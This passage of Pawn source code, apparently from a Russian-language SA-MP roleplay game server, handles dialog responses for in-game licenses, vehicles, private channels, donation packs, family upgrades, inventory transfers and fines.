			    case 2: SetPlayerRaceCheckpoint(playerid,2,2291.0505,2468.5820,10.8203,0,0,0,1);
			    case 3: SetPlayerRaceCheckpoint(playerid,2,988.0936,1078.4991,10.8130,0,0,0,1);
			}
			SetPVarInt(playerid,"GPS",1);
			DeletePVar(playerid,"Fracs");
		}
	/*	case 443:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
			        query = "";
					new kek = 0;
			        static const fmt_strin1g[] = "%d | %s\t[%d]\t[%d$]\n";
					new s1tr[sizeof(fmt_strin1g)+50];
			        for(new i = 0; i < 100; i++)
			        {
			            if(!TorgInfo[i][tgIDProd]) continue;
						format(s1tr,sizeof(s1tr),fmt_strin1g,kek,InvType[TorgInfo[i][tgIDProd]][invText],TorgInfo[i][tgKolvo],TorgInfo[i][tgCena]);
						strcat(query,s1tr);
		                kek++;
			        }
			        ShowPlayerDialog(playerid,444,DIALOG_STYLE_TABLIST,"Каталог товаров",query,"Далее","Отмена");
			    }

			}
		}*/
		case 445:
		{
		    if(!response) return 1;
		    if(PlayerInfo[playerid][pLic][listitem]) return SendClientMessage(playerid,CGREY,"У Вас уже есть данная лицензия!");
		    if(random(5) == 1)
		    {
		        SendClientMessage(playerid,CREWARD,"Вы получили поддельную лицензию!");
		        SendClientMessage(playerid,CREWARD,"Внимание! При показе полиции будет видно, что лицензия поддельная");
		        PlayerInfo[playerid][pLic][listitem] = 2;
		        PlayerInfo[playerid][pLicTime][listitem] = gettime()+60*60*24*90;
		        GiveInv(playerid,449,1);
		    }
		    else
		    {
		        SendClientMessage(playerid,CREWARD,"У бандита закончились шаблоны, направляйтесь в ближайший полицейский департамент!");
				SetPVarInt(playerid,"Lics",listitem);
				SetPVarInt(playerid,"LicsW",1);
				
		    }
		}
		case 446:
		{
			if(!response) return 1;
			ShowPlayerDialog(playerid,447,DIALOG_STYLE_INPUT,"Выбор цвета","{ffffff}Выберите цвет транспорта через запятую:\n\nНапример: 6,6","Далее","Отмена");
			SetPVarInt(playerid,"IDCar",IDVehicl[listitem]);
		}
		case 447:
		{
		    if(!response) return DeletePVar(playerid,"IDCar");
		    new color[2];
			if(sscanf(inputtext, "p<,>ii",color[0], color[1])) return ShowPlayerDialog(playerid,447,DIALOG_STYLE_INPUT,"Выбор цвета","{ffffff}Выберите цвет транспорта через запятую:\n\nНапример: 6,6","Далее","Отмена");
		 	if(color[0] < 0 || color[0] > 252)
			{
				ShowPlayerDialog(playerid,447,DIALOG_STYLE_INPUT,"Выбор цвета","{ffffff}Выберите цвет транспорта через запятую:\n\nНапример: 6,6","Далее","Отмена");
				return SendClientMessage(playerid, CGREY, "ID цвета от 0 до 252!");
			}
			if(color[1] < 0 || color[1] > 252)
			{
				ShowPlayerDialog(playerid,447,DIALOG_STYLE_INPUT,"Выбор цвета","{ffffff}Выберите цвет транспорта через запятую:\n\nНапример: 6,6","Далее","Отмена");
				return SendClientMessage(playerid, CGREY, "ID цвета от 0 до 252!");
			}
			new rand = random(5);
			for(new i = 0; i < 5; i++)
			{
				if(FBIStatus[i]) continue;
				DestroyVehicle(FBICars[i]);
				FBICars[i]  = CreateVehicle(GetPVarInt(playerid,"IDCar"),Vehicl[rand][0],Vehicl[rand][1],Vehicl[rand][2],Vehicl[rand][3],color[0], color[1],-1);
				SetVehicleVirtualWorld(FBICars[i],0);
				FBIStatus[i] = true;
				SetPVarInt(playerid,"FBICAR",i);
				break;
			}
			
			SetPlayerRaceCheckpoint(playerid,2,Vehicl[rand][0],Vehicl[rand][1],Vehicl[rand][2],0,0,0,5);
			SetPVarInt(playerid,"GPS",1);
			SendClientMessage(playerid,CREWARD,"На карте показана отметка, где находится транспорт!");
			DeletePVar(playerid,"IDCar");
		}
		case 448:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
					kanals = (!kanals) ? (true) : (false);
					if(kanals) SendClientMessage(playerid,CREWARD,"Вы открыли канал!");
					else SendClientMessage(playerid,CREWARD,"Вы закрыли канал!");
			    }
				case 1:
				{
				    new str[70];
				    query = "{ffffff}";
				    for(new i = 0; i < MAX_PLAYERS; i++)
					{
				    	if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"FR")) continue;
				    	format(str,sizeof(str),"%s [id: %d]\n",PlayerInfo[i][pSendername],i);
				    	strcat(query,str);
				    }
				    ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Список участников",query,"Далее","");
				}
				case 2: ShowPlayerDialog(playerid,449,DIALOG_STYLE_INPUT,"Пригласить в канал","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
				case 3: ShowPlayerDialog(playerid,450,DIALOG_STYLE_INPUT,"Удалить из канала","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
			}
		}
		case 449:
		{
		    if(!response) return ShowPlayerDialog(playerid,448,DIALOG_STYLE_LIST,"Меню канала","1 | Открыть/закрыть канал\n2 | Список участников\n3 | Пригласить в канал\n4 | Удалить из канала","Далее","Отмена");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,449,DIALOG_STYLE_INPUT,"Пригласить в канал","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
			new player = strval(inputtext);
			if(GetPVarInt(player,"FR")) return SendClientMessage(playerid,CGREY,"Игрок уже состоит в приватном канале!");
			new Float:x,Float:y,Float:z;
			GetPlayerPos(player,x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			SendClientMessage(player,-1,"Вас пригласили в приватный канал. Используйте: {f7ae11}/fr");
			static const fmt_string[] = "Вы пригласили %s в приватный канал";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[player][pSendername]);
			SendClientMessage(player,CREWARD,str);
			SetPVarInt(player,"FR",1);
		}
		case 450:
		{
		    if(!response) return ShowPlayerDialog(playerid,448,DIALOG_STYLE_LIST,"Меню канала","1 | Открыть/закрыть канал\n2 | Список участников\n3 | Пригласить в канал\n4 | Удалить из канала","Далее","Отмена");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,450,DIALOG_STYLE_INPUT,"Удалить из канала","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
			new player = strval(inputtext);
			if(!GetPVarInt(player,"FR")) return SendClientMessage(playerid,CGREY,"Игрок не состоит в приватном канале!");
			SendClientMessage(player,CREWARD,"Вас выгнали из приватного канала!");
			static const fmt_string[] = "Вы выгнали %s из приватного канала";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[player][pSendername]);
			SendClientMessage(player,CREWARD,str);
			DeletePVar(player,"FR");
		}
		
		case 452:
		{
		    if(!response) return DeletePVar(playerid,"Etaz");
		    if(GetPVarInt(playerid,"Etaz") == listitem) return SendClientMessage(playerid,CGREY,"Вы и так на этом этаже!");
			SetCameraBehindPlayer(playerid);
			DeletePVar(playerid,"Etaz");
			switch(listitem)
			{
			    case 0: // 3 этаж
			    {
			        SetPlayerPos(playerid,1388.7009,8.9067,1000.9153);
				    SetPlayerFacingAngle(playerid,178.7511);
				    SetPlayerVirtualWorld(playerid,67);
				    SetPlayerInterior(playerid,35);
				    FreezePlayer(playerid,1388.7009,8.9067,0.8);
			    }
			    case 1: // 2 этаж
			    {
			        SetPlayerPos(playerid,1388.3995,9.3642,1000.9153);
				    SetPlayerFacingAngle(playerid,180.2942);
				    SetPlayerVirtualWorld(playerid,66);
				    SetPlayerInterior(playerid,35);
				    FreezePlayer(playerid,1388.3995,9.3642,0.8);
			    }
			    case 2: // 1 этаж
			    {
			        SetPlayerPos(playerid,1412.5636,-14.9454,1000.9153);
				    SetPlayerFacingAngle(playerid,178.0074);
				    SetPlayerVirtualWorld(playerid,65);
				    SetPlayerInterior(playerid,35);
				    FreezePlayer(playerid,1412.5636,-14.9454,0.8);
			    }
			    case 3: // парковка
			    {
			        SetPlayerPos(playerid,998.7595,1089.4596,2997.4297);
				    SetPlayerFacingAngle(playerid,271.8204);
				    SetPlayerVirtualWorld(playerid,95);
				    SetPlayerInterior(playerid,4);
				    FreezePlayer(playerid,998.7595,1089.4596,0.8);
			    }
			}
			SetPVarInt(playerid,"FloodLift",gettime()+3);
		}
		case 453:
		{
		    if(!response) return 1;
		    if(listitem >= 2) listitem++;
		    new str[90];
			query = "";
			for(new i = 1; i <= 10; i++)
			{
				format(str,sizeof(str),"%i | %s\n",i,FracRank[listitem][i]);
				strcat(query, str);
			}
			ShowPlayerDialog(playerid,455,DIALOG_STYLE_LIST,"Выберите ранг",query,"Далее","Отмена");
			
			SetPVarInt(playerid,"Badge",listitem);
			
		}
		case 454:
		{
		    if(!response) return 1;
		    if(listitem >= 3) listitem++;
			if(listitem == 0) SetSkin(playerid);
			else
			{
			    SetPlayerSkin(playerid,FracInfo[listitem][fMSkin][random(9)+1]);
				switch(listitem)
				{
					case F_MAYOR: SetPlayerColor(playerid, 0xEEEEEEAA);
					case F_LVPD: SetPlayerColor(playerid, 0x74C1FAAA);
					case F_FBI: SetPlayerColor(playerid, 0x61A3DBAA);
					case F_HOSPITAL_LS: SetPlayerColor(playerid, 0xFE7373AA);
					case F_LIC: SetPlayerColor(playerid, 0xB5DEFCAA);
					case F_GROVE: SetPlayerColor(playerid, 0x10DC29AA);
					case F_BALLAS: SetPlayerColor(playerid, 0x8813E7AA);
					case F_BIKERS: SetPlayerColor(playerid, 0xC6AC6EAA);
					case F_AZTECAS: SetPlayerColor(playerid, 0x01FCFFAA);
					case F_VAGOS: SetPlayerColor(playerid, 0xDBD604AA);
					case F_ARMY: SetPlayerColor(playerid, 0x331b06AA);
					case F_LCN: SetPlayerColor(playerid, 0x454545AA);
					case F_RM: SetPlayerColor(playerid, 0xAFAFAFAA);
					case F_NEWS: SetPlayerColor(playerid, 0xFF924AAA);
					case F_YAKUZA: SetPlayerColor(playerid, 0xA31C1CAA);
					case F_RIFA: SetPlayerColor(playerid, 0x83BFBFAA);
				}
			}
		}
		case 455:
		{
			if(!response) return DeletePVar(playerid,"Badge");
			SetPVarInt(playerid,"Ranks",listitem+1);
			SendClientMessage(playerid,-1,"Вы взяли поддельные документы, чтобы иъ использовать введите: {f7ae11}/fbadge");
		}
		case 456:
		{
			if(!response)
			{
			    DeletePVar(playerid,"DCena");
				return RemovePlayerFromVehicle(playerid);
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"DCena"))
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    DeletePVar(playerid,"DCena");
			    return true;
			}
			new nap;
		    switch(GetPVarInt(playerid,"DCena"))
		    {
		        case 50: nap = 5;
		        case 75: nap = 10;
		        case 90: nap = 15;
		    }
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			GiveMoney(playerid,-GetPVarInt(playerid,"DCena"));
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"Raz",1);
			SetPVarInt(playerid,"Mar",36);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SendClientMessage(playerid,-1,"Вы арендовали машину дальнобойшиков. Для того, чтобы посмотреть цены используйте {f7ae11}/tmonitoring");
			SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			new str[40];
			format(str,sizeof(str),"Загруженно: {f7ae11}0/%d т.",nap);
			UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str);
			DeletePVar(playerid,"DCena");
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
		case 457:
		{
		    if(!response) return DeletePVar(playerid,"AGLP");
		    new player = GetPVarInt(playerid,"AGLP");
			if(PlayerInfo[player][pLic][listitem] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
			PlayerInfo[player][pLic][listitem] = 1;
			PlayerInfo[player][pLicTime][listitem] = gettime()+60*60*24*90;
			new text[30];
			switch(listitem)
			{
			    case L_AVTO: text = "автомобиль";
			    case L_MOTO: text = "мототранспорт";
			    case L_VOD: text = "водный транспорт";
			    case L_VOZ: text = "воздушный транспорт";
			    case L_GRUZ: text = "грузовой транспорт";
			    case L_BUS: text = "автобус";
			    case L_GUN: text = "ношение оружия";
			}
			GiveInv(player,449,1);
			static const fmt_string5[] = "Администратор {f7ae11}%s{FFFFFF} выдал вам лицензию на {f7ae11}%s{FFFFFF}";
			new str5[sizeof(fmt_string5)+MAX_PLAYER_NAME+25];
			format(str5, sizeof(str5), fmt_string5,PlayerInfo[playerid][pSendername],text);
			SendClientMessage(player,-1,str5);
			static const fmt_string[] = "[A] %s выдал игроку %s лицензию на %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[player][pSendername],text);
			SendAdminMessage(CGREY,str);
			DeletePVar(playerid,"AGLP");
		}
		case 458:
		{
		    if(!response) return DeletePVar(playerid,"AGLP");
		    new player = GetPVarInt(playerid,"AGLP");
			if(PlayerInfo[player][pLic][listitem] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет данной лицензии");
			PlayerInfo[player][pLic][listitem] = 0;
			PlayerInfo[player][pLicTime][listitem] = 0;
			new text[30];
			switch(listitem)
			{
			    case L_AVTO: text = "автомобиль";
			    case L_MOTO: text = "мототранспорт";
			    case L_VOD: text = "водный транспорт";
			    case L_VOZ: text = "воздушный транспорт";
			    case L_GRUZ: text = "грузовой транспорт";
			    case L_BUS: text = "автобус";
			    case L_GUN: text = "ношение оружия";
			}
			InvMinus(playerid,449,1);
	   	   	static const fmt_string1[] = "%s{FFFFFF} отобрал у Вас лицензию на {f7ae11}%s";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+25];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],text);
			SendClientMessage(player,CREWARD,str1);
			static const fmt_string4[] = "Вы отобрали у {f7ae11}%s{FFFFFF} лицензию на {f7ae11}%s";
			new str4[sizeof(fmt_string4)+MAX_PLAYER_NAME+25];
			format(str4, sizeof(str4), fmt_string4,PlayerInfo[player][pSendername],text);
			SendClientMessage(playerid,-1,str4);
			DeletePVar(playerid,"AGLP");
		}
		case 459:
		{
		    if(!response) return cmd_lpanel(playerid);
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 5 || nick > 25) return ShowPlayerDialog(playerid,459,DIALOG_STYLE_INPUT,"Цена за койку","{FFFFFF}Введите цену за койку в больнице:\nОт 5$ до 25$","Далее","Отмена");
		    KoykaCena = nick;
		    SetMatsInt("KoykaCena",nick);
		    static const fmt_string2[] = "Новая цена за койку в больнице %i$";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,nick);
			SendGov(playerid,str2);
		}
		case 460:
		{
			if(!response) return 1;
			format(query,sizeof(query),"UPDATE `accounts` SET `fam` = '0' WHERE id = '%d' AND fam = '%d'  LIMIT 1",ListNick[playerid][listitem],PlayerInfo[playerid][pFam]);
			mysql_tquery(mysql,query);
			SendClientMessage(playerid,CREWARD,"Игрок выгнан из семьи!");
		}
		case 461:
		{
		    if(!response) return cmd_donate(playerid);
		    switch(listitem)
		    {
		        case 0:
				{
				    if(PlayerInfo[playerid][pMash] > 0) return SendClientMessage(playerid,CREWARD,"Вы уже покупали набор новичка");
				    if(PlayerInfo[playerid][pDonate] < 150)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pDonate] -= 150;
				    GiveMoney(playerid,100000);
				    PlayerInfo[playerid][pMash] = 1;
					PlayerInfo[playerid][pLic][0] = 1;
					PlayerInfo[playerid][pLicTime][0] = gettime()+60*60*24*90;
					GiveInv(playerid,449,1);
					if(PlayerInfo[playerid][pLevel] < 2)
					{
						PlayerInfo[playerid][pLevel]= 2;
						SetPlayerScore(playerid,PlayerInfo[playerid][pLevel]);
					}
					SaveAccount(playerid);
					SendClientMessage(playerid,CREWARD,"Вы получили 100.000$, лицензию на машину и 2 уровень");
				}
				case 1:
				{
				    if(PlayerInfo[playerid][pMash2] > 0) return SendClientMessage(playerid,CREWARD,"Вы уже покупали набор новичка");
				    if(PlayerInfo[playerid][pDonate] < 250)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pDonate] -= 250;
				    GiveMoney(playerid,190000);
				    PlayerInfo[playerid][pMash2] = 1;
					PlayerInfo[playerid][pGunSkill][1] = 1000;
					PlayerInfo[playerid][pGunSkill][2] = 1000;
					PlayerInfo[playerid][pGunSkill][5] = 1000;
					SetPlayerSkills(playerid);
					PlayerInfo[playerid][pLic][0] = 1;
					PlayerInfo[playerid][pLicTime][0] = gettime()+60*60*24*90;
					GiveInv(playerid,449,1);
					if(PlayerInfo[playerid][pLevel] < 3)
					{
						PlayerInfo[playerid][pLevel]= 3;
						SetPlayerScore(playerid,PlayerInfo[playerid][pLevel]);
					}
					SaveAccount(playerid);
					SendClientMessage(playerid,CREWARD,"Вы получили 190.000$, лицензию на машину, 3 уровень и скиллы на Deagle, M4, ShotGun");
				}
				case 2:
				{
				    if(PlayerInfo[playerid][pMash1] > 0) return SendClientMessage(playerid,CREWARD,"Вы уже покупали набор премиум");
				    if(PlayerInfo[playerid][pDonate] < 1000)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pDonate] -= 1000;
				    GiveMoney(playerid,1000000);
				    PlayerInfo[playerid][pMash1] = 1;
					PlayerInfo[playerid][pLic][0] = 1;
					PlayerInfo[playerid][pLic][1] = 1;
					PlayerInfo[playerid][pLic][2] = 1;
					PlayerInfo[playerid][pLic][3] = 1;
					PlayerInfo[playerid][pLic][4] = 1;
					PlayerInfo[playerid][pLicTime][0] = gettime()+60*60*24*90;
					PlayerInfo[playerid][pLicTime][1] = gettime()+60*60*24*90;
					PlayerInfo[playerid][pLicTime][2] = gettime()+60*60*24*90;
					PlayerInfo[playerid][pLicTime][3] = gettime()+60*60*24*90;
					PlayerInfo[playerid][pLicTime][4] = gettime()+60*60*24*90;
					GiveInv(playerid,449,5);
					PlayerInfo[playerid][pGunSkill][0]=1000;
					PlayerInfo[playerid][pGunSkill][1]=1000;
					PlayerInfo[playerid][pGunSkill][2]=1000;
					PlayerInfo[playerid][pGunSkill][3]=1000;
					PlayerInfo[playerid][pGunSkill][4]=1000;
					PlayerInfo[playerid][pGunSkill][5]=1000;
					if(PlayerInfo[playerid][pLevel] < 5)
					{
						PlayerInfo[playerid][pLevel]= 5;
						SetPlayerScore(playerid,PlayerInfo[playerid][pLevel]);
					}
					SaveAccount(playerid);
					SendClientMessage(playerid,CREWARD,"Вы получили 1.000.000$, все лицензии, все скиллы и 5 уровень");
				}
		    	case 3: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Информация о наборах","{f7ae11}Набор новичек{FFFFFF}\n\t100.000$\n\tЛицензия на автомобиль\n\t2 уровень\n\n{f7ae11}Набор средний{FFFFFF}\n\t190.000$\n\tЛицензия на автомобиль\n\t3 уровень\n\tСкиллы на Deagle, M4, ShotGun\n\n{f7ae11}Набор премиум{FFFFFF}\n\t1.000.000$\n\tВсе лицензии\n\t5 уровень\n\tВсе скиллы","Закрыть","");
			}
		}
		case 462:
		{
		    if(!response) return 1;
		    if(!strval(inputtext) ||  4 < strlen(inputtext) < 4) return ShowPlayerDialog(playerid,462,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите новый PIN-CODE от карты:\n\n","Далее","Отмена");
			PlayerInfo[playerid][pBankPin] = strval(inputtext);
			SendClientMessage(playerid,CREWARD,"Вы изменили PIN-CODE от карты!");
		}
		case 463:
		{
		    if(!response) return cmd_family(playerid);
		    if(FamInfo[PlayerInfo[playerid][pFam]][fUl][listitem]) return SendClientMessage(playerid,CGREY,"У семьи уже есть данное улучшение!");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,464,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Увеличение мест в семье'.\nВы сможете принять в семью больше 10 человек.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}50 Donate Point","Далее","Назад");
				case 1: ShowPlayerDialog(playerid,464,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Увеличенный автопарк'.\nВы сможете купить для семью больше 3 транспортных средств.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}75 Donate Point","Далее","Назад");
				case 2: ShowPlayerDialog(playerid,464,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Тюнинг транспорта'.\nВы сможете тюнинговать транспорт семьи.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}100 Donate Point","Далее","Назад");
			}
			ListNick[playerid][0] = listitem;
		}
		case 464:
		{
		    if(!response) return ShowPUl(playerid);
		    if(FamInfo[PlayerInfo[playerid][pFam]][fUl][ListNick[playerid][0]]) return 1;
		    switch(ListNick[playerid][0])
		    {
	   		 	case 0: if(PlayerInfo[playerid][pDonate] < 50) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    case 1: if(PlayerInfo[playerid][pDonate] < 75) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    case 2: if(PlayerInfo[playerid][pDonate] < 100) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
   			switch(ListNick[playerid][0])
		    {
	   		 	case 0: PlayerInfo[playerid][pDonate] -= 50;
			    case 1: PlayerInfo[playerid][pDonate] -= 75;
			    case 2: PlayerInfo[playerid][pDonate] -= 100;
			}
			FamInfo[PlayerInfo[playerid][pFam]][fUl][ListNick[playerid][0]] = 1;
			SendClientMessage(playerid,CREWARD,"Вы приобрели улучшение");
		}
		case 465:
		{
		    if(!response)
		    {
				PlayerTextDrawHide(playerid,InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid]);
				PlayerTextDrawBackgroundColor(playerid, InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid], 589505535);
				PlayerTextDrawShow(playerid,InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid]);
		        return DeletePVar(playerid,"SetInvID");
		    }
		    new i = GetPVarInt(playerid,"SetInvID");
		    if(!strlen(inputtext) || strval(inputtext) < 1 || strval(inputtext) > InvInfo[playerid][iKol][i]) return ShowPlayerDialog(playerid,465,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
            PlayerTextDrawHide(playerid,InventoryP[i+6][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i+6][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP[i+6][playerid]);
			if(GetPVarInt(playerid,"OpenHouse"))
			{
			 //   new x = GetPVarInt(playerid,"PlayerHouse");
			    if(GetFreeHouse(playerid,InvInfo[playerid][iSlot][i],strval(inputtext)))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно места в шкафу");
                    return ShowPlayerDialog(playerid,465,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    }
			    GiveHouseInv(playerid,InvInfo[playerid][iSlot][i],strval(inputtext));
				InvMinus(playerid,InvInfo[playerid][iSlot][i],strval(inputtext));
				
			}
			if(GetPVarInt(playerid,"OpenTrunk"))
			{
			    new x = GetPVarInt(playerid,"Car");
			    if(GetFreeTrunk(x,InvInfo[playerid][iSlot][i],strval(inputtext)))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно места в багажнике");
                    return ShowPlayerDialog(playerid,465,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    }
			    GiveTrunkInv(x,InvInfo[playerid][iSlot][i],strval(inputtext),playerid);
				InvMinus(playerid,InvInfo[playerid][iSlot][i],strval(inputtext));

			}
			PlayerTextDrawHide(playerid,InventoryP[i+6][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i+6][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP[i+6][playerid]);
			DeletePVar(playerid,"SetInvID");
		}
		case 466:
		{
		    if(!response)
		    {
				PlayerTextDrawHide(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
				PlayerTextDrawBackgroundColor(playerid, InventoryP1[GetPVarInt(playerid,"SetInv")][playerid], 589505535);
				PlayerTextDrawShow(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
		        return DeletePVar(playerid,"SetInvID");
		    }
		    new i = GetPVarInt(playerid,"SetInvID");
		    
		    if(!strlen(inputtext) || strval(inputtext) < 1) return ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
            PlayerTextDrawHide(playerid,InventoryP1[i][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP1[i][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
			if(GetPVarInt(playerid,"OpenHouse"))
			{

			    new x = GetPVarInt(playerid,"PlayerHouse");
			    if(strval(inputtext) > HInfo[x][hInvKol][i]) return ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    if(GetFree(playerid,HInfo[x][hInvSlot][i],strval(inputtext)))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
                    return ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    }
			    GiveInv(playerid,HInfo[x][hInvSlot][i],strval(inputtext));
				InvHouseMinus(playerid,HInfo[x][hInvSlot][i],strval(inputtext),GetPVarInt(playerid,"SetInv"));
				
			}
			if(GetPVarInt(playerid,"OpenTrunk"))
			{
			    new x = GetPVarInt(playerid,"Car");
			    if(strval(inputtext) > BInfo[x][bInvKol][i]) return ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    if(GetFree(playerid,BInfo[x][bInvSlot][i],strval(inputtext)))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
                    return ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
			    }
			    GiveInv(playerid,BInfo[x][bInvSlot][i],strval(inputtext));
				InvTrunkMinus(x,BInfo[x][bInvSlot][i],strval(inputtext),playerid,GetPVarInt(playerid,"SetInv"));

			}
			PlayerTextDrawHide(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP1[GetPVarInt(playerid,"SetInv")][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP1[GetPVarInt(playerid,"SetInv")][playerid]);
			DeletePVar(playerid,"SetInvID");
			DeletePVar(playerid,"SetInv");
		}
		case 467:
		{
			if(!response) return ShowMenuBiz(playerid);
			if(!strval(inputtext) ||  4 < strlen(inputtext) < 4) return ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
			if(strval(inputtext) != PlayerInfo[playerid][pBankPin])
			{
			    SendClientMessage(playerid,CGREY,"Неверный PIN-CODE!");
                return ShowMenuBiz(playerid);
			}
			SetPVarInt(playerid,"Oplata",1);
			ShowMenuBiz(playerid);
		}
		case 468:
		{
		    if(!response) return DeletePVar(playerid,"Shtvaf");
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,469,DIALOG_STYLE_INPUT,"Транспорт","{ffffff}Введите ID транспорта:\n\n","Далее","Отмена");
		        case 1: ShowPlayerDialog(playerid,470,DIALOG_STYLE_INPUT,"Игрок","{ffffff}Введите ID игрока:\n\n","Далее","Отмена");
		    }
		}
		case 469:
		{
		    if(!response) return DeletePVar(playerid,"Shtvaf");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,469,DIALOG_STYLE_INPUT,"Транспорт","{ffffff}Введите номер транспорта:\n\n","Далее","Отмена");
			if(!IsValidVehicle(strval(inputtext))) return SendClientMessage(playerid,CGREY,"Транспорта с таким ID не существует или ему нельзя выписать штраф");
			if(strcmp(LastDriver[strval(inputtext)],"Никто",true))
			{
				new player = GetPlayerID(LastDriver[strval(inputtext)]);
				if(player == playerid) return 1;
			    if(player != INVALID_PLAYER_ID)
			    {
			        PlayerInfo[player][pShtrav] += GetPVarInt(playerid,"Shtvaf");
			        static const fmt_str[] = "%s выписал Вам штраф в размере %d$";
					new string[sizeof(fmt_str)+MAX_PLAYER_NAME+4];
					format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"Shtvaf"));
					SendClientMessage(playerid,CYELLOW,string);
					static const fmt_string1[] = "[R] %s | %s выписал штраф %s в размере %d$";
					new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
					format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pSendername],PlayerInfo[player][pSendername],GetPVarInt(playerid,"Shtvaf"));
